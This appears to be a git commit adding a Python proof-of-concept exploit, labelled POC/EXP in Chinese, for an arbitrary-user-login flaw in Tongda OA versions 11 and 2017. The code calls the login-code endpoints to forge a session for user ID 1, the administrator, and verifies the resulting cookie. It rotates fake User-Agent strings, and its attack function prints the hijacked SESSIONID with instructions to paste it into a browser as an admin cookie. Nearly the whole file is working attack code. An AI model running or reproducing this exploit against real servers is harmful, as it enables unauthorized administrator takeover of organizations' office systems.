988c1a3077043967ff74c4f38d7c4beb1a9650db
tr0uble-mAker <929305053@qq.com>
2022-01-10 00:12:05 +0800

    新增POC/EXP 通达OA 任意用户登录漏洞

---
+++ pocs/web/tongda/tongda_oa_fake_user.py
@@ -0,0 +1,131 @@
+import requests
+from random import choice
+import urllib
+import json
+
+USER_AGENTS = [
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)",
+    "Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
+    "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)",
+    "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)",
+    "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)",
+    "Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1",
+    "Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0",
+    "Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5",
+    "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20",
+    "Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
+    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)",
+    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)",
+    "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
+    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1",
+    "Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5",
+    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre",
+    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0",
+    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",
+    "Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"
+]
+headers = {}
+
+def getV11Session(url):
+    checkUrl = urllib.parse.urljoin(url, '/general/login_code.php')
+    try:
+        headers["User-Agent"] = choice(USER_AGENTS)
+        res = requests.get(checkUrl, headers=headers, timeout=3)
+        resText = str(res.text).split('{')
+        codeUid = resText[-1].replace('}"}', '').replace('\r\n', '')
+        getSessUrl = urllib.parse.urljoin(url, '/logincheck_code.php')
+        res = requests.post(
+            getSessUrl, data={'CODEUID': '{'+codeUid+'}', 'UID': int(1)},headers=headers, timeout=3)
+        tmp_cookie = res.headers['Set-Cookie']
+        headers["User-Agent"] = choice(USER_AGENTS)
+        headers["Cookie"] = tmp_cookie
+        check_available = requests.get(urllib.parse.urljoin(url + '/general/index.php'), headers=headers, timeout=3)
+        if '用户未登录' not in check_available.text:
+            if '重新登录' not in check_available.text:
+                return tmp_cookie
+        else:
+            return False
+    except:
+        return False
+
+
+
+def get2017Session(url):
+    checkUrl = url+'/ispirit/login_code.php'
+    try:
+        headers["User-Agent"] = choice(USER_AGENTS)
+        res = requests.get(checkUrl,headers=headers)
+        resText = json.loads(res.text)
+        codeUid = resText['codeuid']
+        codeScanUrl = url+'/general/login_code_scan.php'
+        res = requests.post(codeScanUrl, data={'codeuid': codeUid, 'uid': int(
+            1), 'source': 'pc', 'type': 'confirm', 'username': 'admin'},headers=headers)
+        resText = json.loads(res.text)
+        status = resText['status']
+        if status == str(1):
+            getCodeUidUrl = url+'/ispirit/login_code_check.php?codeuid='+codeUid
+            res = requests.get(getCodeUidUrl)
+            tmp_cookie = res.headers['Set-Cookie']
+            headers["User-Agent"] = choice(USER_AGENTS)
+            headers["Cookie"] = tmp_cookie
+            check_available = requests.get(url + '/general/index.php',headers=headers)
+            if '用户未登录' not in check_available.text:
+                if '重新登录' not in check_available.text:
+                    return tmp_cookie
+            else:
+                return False
+        else:
+            return False
+    except:
+        return False
+
+
+def verify(url):
+    relsult = {
+        'name': '通达OA 任意用户登录漏洞',
+        'vulnerable': False,
+        'attack': True,
+    }
+    try:
+        for version in [11, 2017]:
+            if version == 11:
+                r = getV11Session(url)
+            else:
+                r = get2017Session(url)
+            if r:
+                relsult['vulnerable'] = True
+                relsult['url'] = url
+                relsult['version'] = version
+                relsult['sessions'] = r
+                relsult['about'] = 'https://github.com/NS-Sp4ce/TongDaOA-Fake-User/blob/master/POC.py'
+                return relsult
+        return relsult
+    except:
+        return relsult
+
+
+def attack(url):
+    try:
+        relsult = verify(url)
+        if relsult['vulnerable']:
+            print('[*] 获取到可用的 SESSIONID : {0}'.format(relsult['sessions']))
+            print('[+] 将SESSIONID复制到游览器cookie即可以管理员身份登陆!')
+            return True
+        return False
+    except:
+        return False
